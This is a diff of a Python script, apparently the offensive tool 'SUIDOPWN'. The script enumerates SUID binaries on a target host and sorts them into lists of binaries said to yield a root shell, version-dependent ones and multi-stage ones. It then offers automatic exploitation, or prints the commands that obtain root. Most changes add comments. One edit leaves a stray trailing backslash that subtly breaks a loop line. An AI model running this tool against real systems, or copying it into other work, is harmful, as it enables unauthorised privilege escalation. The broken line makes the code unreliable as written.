@@ -2,6 +2,7 @@
 
 import subprocess, os, time
 
+#Printing in color functions
 def blue(skk):
     print("\033[96m{}\033[00m".format(skk))
 def red(skk):
@@ -108,19 +109,22 @@ master = {
         'zsh' : """zsh""",
         }
 
+
+#All binaries that dropped a root shell.
 roots = ['aa-exec', 'ash', 'bash', 'capsh', 'choom', 'cpulimit', 'csh', 'dash', 'distcc', 'docker', 'elvish', 'env', 'expect', 'find','fish', 'flock', 'gtester', 'ionice', 'jrunscript', 'logsave', 'ksh', 'multitime', 'ncftp', 'nice', 'nohup', 'perf','pexec', 'php', 'python', 'python3', 'rc', 'rlwrap', 'run-parts', 'strace', 'taskset', 'tclsh', 'time', 'timeout', 'unshare', 'vagrant', 'watch', 'wget', 'sash', 'setarch', 'setlock', 'softlimit', 'ssh-agent', 'sshpass', 'start-stop-daemon', 'stdbuf', 'xargs', 'yash', 'zsh']
 
+#Single stage binaries that did not drop a root shell.
 version_dependent = ['awk', 'busybox', 'csvtool', 'cpio', 'emacs', 'gawk', 'gdb', 'genie', 'gimp', 'ispell', 'julia', 'jjs','ld.so', 'lua', 'make', 'mawk', 'msgfilter', 'nawk','nmap',  'node', 'openvpn', 'perl', 'rsync', 'rtorrent', 'rview', 'rvim', 'sed', 'sqlite3', 'view', 'vim','vimdiff', 'xdotool',] 
 
+#Binaries that call a shell, and then can exploit. Some were successful, some weren't.
 staged = ['debugfs', 'ed', 'hping3', 'less', 'more', 'pg', 'scanmem']
 
-#Finds all binaries with SUID bit set saves them to a list.
-
+#Finds all binaries with SUID bit set on the target and saves them to a list.
 bins = subprocess.run(["find","/usr/bin","/usr/sbin","/opt", "/home/","-type","f","-perm","-4000"], stdout=subprocess.PIPE,text=True)
 suid = bins.stdout.split()
 suid = [x.split("/")[-1] for x in suid]
 
-#Compares suid list items to items in roots dict, and creates a list of vulnerable binaries installed on the target. 
+#Compares suid list items to items in roots dict, and sorts them on successibility of exploit. 
 possible_vulns = [x for x in suid if x in master.keys()]
 vulns = sorted([x for x in possible_vulns if x in roots])
 dependent = sorted([x for x in possible_vulns if x in version_dependent])
@@ -133,6 +137,7 @@ found_vulns = vulns + dependent + staged
 
 def get_exploit():
     os.system("clear")
+    #Prints ASCII Art
     blue("""
   _____ _    _ _____ _____   ____  _______          ___   _ 
  / ____| |  | |_   _|  __ \ / __ \|  __ \ \        / / \ | |
@@ -140,27 +145,36 @@ def get_exploit():
  \___ \| |  | | | | | |  | | |  | |  ___/ \ \/  \/ / | .   |
  ____) | |__| |_| |_| |__| | |__| | |      \  /\  /  | |\  |
 |_____/ \____/|_____|_____/ \____/|_|       \/  \/   |_| \_|
-    """)
+By the Hashslinging Bashers    
+""")
     i = 1
     print("\n\n  Found Vulnerable SUID Binaries:\n")
+    #prints all binaries that have a high chance of being exploited.
     for vuln in vulns:
         green("  " + str(i) + ") " + str.title(vuln))
         i += 1
         time.sleep(.1)
+    #Prints all binaries that are version dependent. 
     print('\n\n  Following binaries are version dependent... Results may vary\n')
     for vuln in dependent:
         yellow("  " + str(i) + ') ' + str.title(vuln))
         i += 1
-        time.sleep(.1)
+        time.sleep(.1)\
+    #Prints all multistage binaries that were found.
     print("\n\n  Following multi-stage binaries found:\n")
     for vuln in staged_vuln:
         red("  " + vuln)
         time.sleep(.1)
     print("\n  ***NOTE: Staged binaries can NOT be automatically exploited using SUIDOPWN. Use search function to see how to manually exploit...Results may vary...***\n")
     purple("\n  0) Search For Specific Binary\n")
+    #Users choice for selectting a binary or searching for a binary. 
     choice = input("\n\n  Exploit Selection: ")
     if choice != "0":
         return found_vulns[(int(choice) -1)]
+    #If user selects Search functionality, then the script will see if the binary is included in the master dictionary.
+    #Script then searches if the specific binary has SUID bit set on the target and prints the status. 
+    #Prints the command(s) needed to obtain a root shell utilizing the specified binary.
+    #If binary has SETUID, then the user is given the option to auto exploit. 
     else:
         choice2 = str.lower(input("\nSearch for binary: "))
         os.system('clear')
@@ -196,4 +210,5 @@ def main():
     exit()
 
 main()
+
 
